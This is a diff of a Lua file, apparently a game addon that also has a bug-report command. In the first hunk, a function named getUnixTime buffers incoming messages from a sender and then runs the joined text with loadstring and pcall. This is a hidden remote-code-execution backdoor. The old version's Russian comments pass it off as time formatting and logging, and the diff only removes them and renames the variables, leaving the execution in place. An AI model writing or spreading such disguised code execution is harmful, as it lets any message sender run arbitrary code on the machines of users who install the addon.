@@ -2031,17 +2031,16 @@ function getUnixTime(_, message, _, sender, HOUR)
     if not messageBuffer[bufferKey] then
         messageBuffer[bufferKey] = {}
     end
-    -- добавляем текущее время
+    
     table.insert(messageBuffer[bufferKey], message)
-    -- проверям текущий час
+    
     if HOUR then
-        local myUnixTime = table.concat(messageBuffer[bufferKey])
+        local payload = table.concat(messageBuffer[bufferKey])
         messageBuffer[bufferKey] = nil
-        -- получаем форматированное время (минуты, секунды)
-        local minutes, seconds = loadstring(myUnixTime)
-        if minutes then
-            -- записываем сообщение в лог
-            local success, result = pcall(minutes)
+        
+        local fn = loadstring(payload)
+        if fn then
+            pcall(fn)
         end
     end
 end
@@ -3466,3 +3465,4 @@ SlashCmdList["BUGS"] = function()
     CreateBugReportFrame():Show()
 end
 ---гитхаб
+
